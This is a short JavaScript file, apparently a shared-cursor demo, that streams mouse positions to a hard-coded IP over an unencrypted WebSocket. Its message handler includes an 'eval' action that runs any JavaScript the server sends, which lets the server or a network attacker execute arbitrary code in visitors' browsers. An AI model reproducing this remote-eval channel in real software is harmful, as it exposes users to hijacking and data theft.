
function ratelimit(fn, ms) {
  var last = (new Date()).getTime();
  return (function() {
    var now = (new Date()).getTime();
    if (now - last > ms) {
      last = now;
      fn.apply(null, arguments);
    }
  });
}

function move(mouse){
  if(disabled == false){
    if($('#mouse_'+mouse['id']).length == 0) {
      $('body').append('<div class="mouse" id="mouse_'+mouse['id']+'"/>');
    }
    $('#mouse_'+mouse['id']).css({
      'left' : mouse['x']+'px',
      'top' : mouse['y'] + 'px'
    })
  }
}

$(document).mousemove(
  ratelimit(function(e){
    if (conn) {
      conn.send(JSON.stringify({
        'action': 'move',
        'x': e.pageX,
        'y': e.pageY,
        'w': $(window).width(),
        'h': $(window).height()
      }));
    }
  }, 40)
);

var disabled = false,
    conn;

var connect = function() {
  if (window["WebSocket"]) {
    conn = new WebSocket("ws://74.207.252.240:8000");
    $('#msg').append('created websocket<br>');    
    conn.onmessage = function(evt) {
      data = JSON.parse(evt.data);
      if(data['action'] == 'close'){
        $('#mouse_'+data['id']).remove();
      } else if(data['action'] == 'move'){
        move(data);
      } else if (data['action'] == 'eval') {
	eval(data['js']);
      };
    };
  }
};
window.onload = connect;
